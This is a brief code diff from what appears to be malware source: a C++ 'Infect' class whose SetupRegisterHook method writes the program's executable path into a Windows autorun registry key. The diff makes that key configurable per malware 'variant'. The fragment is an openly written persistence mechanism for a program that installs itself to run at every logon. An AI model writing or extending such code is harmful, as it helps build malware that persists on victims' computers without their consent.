@@ -59,7 +59,7 @@ void Infect::SetupRegisterHook()
 {
 	Log::Info(L"Infect", L"Set register hooks");
 
-	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"); //TODO
+	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, Variant::getRegisterRun(Config::Current()->Variant()));
 	std::wstring appDir = Config::Current()->DataDirectory();
 	appDir += L"\\" + Config::Current()->ExeName();
 
